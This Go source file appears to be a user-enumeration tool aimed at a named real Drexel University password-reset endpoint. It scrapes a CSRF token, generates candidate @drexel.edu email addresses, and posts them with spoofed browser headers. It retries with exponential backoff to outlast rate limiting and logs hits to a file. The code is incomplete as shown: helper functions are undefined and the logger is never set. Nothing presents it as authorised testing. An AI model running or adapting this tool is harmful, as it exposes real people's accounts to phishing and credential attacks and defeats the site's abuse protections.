package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"math"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
	"time"
)

type WrappedClient struct {
	client    *http.Client
	url       string
	tokenRe   *regexp.Regexp
	csrfToken string
	logger    *slog.Logger
	logFile   *os.File
}

func NewWrappedClient() (WrappedClient, error) {
	wc := WrappedClient{}

	jar, err := cookiejar.New(nil)
	if err != nil {
		return wc, err
	}

	re, err := regexp.Compile(`name="_csrf"\s+value="([^"]+)"`)
	if err != nil {
		return wc, err
	}

	file, err := os.OpenFile("found.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return wc, err
	}

	wc.client = &http.Client{}
	wc.client.Jar = jar
	wc.url = "https://rush08.cci.drexel.edu/user/password/reset"
	wc.tokenRe = re
	wc.logFile = file

	return wc, nil
}

func (wc *WrappedClient) Close() error {
	return wc.logFile.Close()
}

func (wc *WrappedClient) GetCSRFToken() error {
	req, err := http.NewRequest("GET", wc.url, nil)
	if err != nil {
		return err
	}

	resp, err := wc.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	bodyStr := string(bodyBytes)

	matches := wc.tokenRe.FindStringSubmatch(bodyStr)
	if len(matches) < 2 {
		return fmt.Errorf("csrf token not found")
	}

	wc.csrfToken = matches[1]
	return nil
}

func (wc WrappedClient) EnumerateUser(email string) (int, error) {
	payload := map[string]string{
		"_csrf": wc.csrfToken,
		"email": email,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}

	req, err := http.NewRequest("POST", wc.url, bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}

	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	req.Header.Set("Origin", "https://rush08.cci.drexel.edu")
	req.Header.Set("Referer", wc.url)

	resp, err := wc.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	return resp.StatusCode, nil
}

func (wc WrappedClient) GenerateEmails() <-chan string {
	out := make(chan string)

	go func() {
		defer close(out)
		letterLengths := []int{2, 3}
		digitLengths := []int{2, 3}

		for _, lLen := range letterLengths {
			letters := GenerateLetters(lLen)
			for _, dLen := range digitLengths {
				digits := GenerateDigits(dLen)
				for _, l := range letters {
					for _, d := range digits {
						out <- fmt.Sprintf("%s%s@drexel.edu", l, d)
					}
				}
			}
		}
	}()

	return out
}

func (wc WrappedClient) RetryWithExponentialBackoff(baseDelay time.Duration, email string, fn func(string) (int, error)) (int, error) {
	for i := 0; ; i++ {
		status, err := fn(email)
		if status != http.StatusTooManyRequests && err == nil {
			return status, nil
		}

		backoff := baseDelay * time.Duration(math.Pow(2, float64(i)))
		jitter := time.Duration(rand.Int63n(int64(baseDelay)))
		delay := backoff + jitter

		wc.logger.Info("exponential backoff", "attempt", i+1, "failed", err, "delay", delay)
		time.Sleep(delay)
	}
}
